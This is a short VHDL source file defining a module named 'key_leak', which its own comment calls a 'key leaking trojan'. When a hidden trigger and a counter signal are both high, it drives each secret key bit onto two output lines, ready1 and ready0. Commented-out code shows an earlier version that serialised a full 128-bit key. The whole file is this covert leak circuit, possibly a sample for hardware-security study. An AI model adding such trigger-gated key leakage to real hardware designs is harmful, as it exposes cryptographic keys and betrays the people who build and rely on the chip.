----------------------------------------------------------------------------------
-- Company: 
-- Engineer: 
-- 
-- Create Date:    20:30:55 02/09/2017 
-- Design Name: 
-- Module Name:    key_leak - Behavioral 
-- Project Name: 
-- Target Devices: 
-- Tool versions: 
-- Description: 
--
-- Dependencies: 
--
-- Revision: 
-- Revision 0.01 - File Created
-- Additional Comments: 
--
----------------------------------------------------------------------------------
library IEEE;
use IEEE.STD_LOGIC_1164.ALL;

-- Uncomment the following library declaration if using
-- arithmetic functions with Signed or Unsigned values
--use IEEE.NUMERIC_STD.ALL;

-- Uncomment the following library declaration if instantiating
-- any Xilinx primitives in this code.
--library UNISIM;
--use UNISIM.VComponents.all;

entity key_leak is
Port(clr: in std_logic;
	clk: in std_logic;
	counter: in std_logic;
	trojan_trigger: in std_logic;
	--leak_key: in std_logic_vector (127 downto 0);
	leak_key: in std_logic;
	ready1: out std_logic;
	ready0: out std_logic);
end key_leak;

architecture Behavioral of key_leak is
--SIGNAL timer : integer range 0 to 99999999;
--SIGNAL digit : integer range 0 to 128;
--signal key: std_logic_vector(127 downto 0);
--constant CNTR_MAX : std_logic_vector(23 downto 0) := x"030D40"; --100,000,000 = clk cycles per second

begin

--key leaking trojan
process(clr,clk,trojan_trigger,leak_key)begin
	if(clr = '0')then
			ready1<='0';
			ready0<='0';
		--key(127 downto 0)<=X"00000000000000000000000000000000"; 
		--timer<=0; 
		--digit<=0;
	elsif(clk'EVENT AND clk='1' )then
--		if (trojan_trigger='1') then 
--			key(127 downto 0) <= leak_key (127 downto 0) ;
--		else 
--			key(127 downto 0) <= X"00000000000000000000000000000000"; 
--		end if;
		
		--if(timer<=99999999)then
		--	timer <= timer + 1;	
--		elsif(digit=128)then
--			digit<=0;
--		else
--			ready <= key(digit);
--			digit <= digit + 1;
--			--timer<=0;
--		end if;
		if(counter='1' and trojan_trigger = '1')then
			if(leak_key='1')then
				ready1 <= '1';
				ready0 <= '0';
			elsif(leak_key='0')then
				ready1 <= '0';
				ready0 <= '1';
			end if;
--			digit <= digit + 1 ;
--		elsif (digit=128)then
--			digit <= 0 ;
		else
			ready1 <= '0';
			ready0 <= '0';
		end if;
	end if;
end process;
end Behavioral;

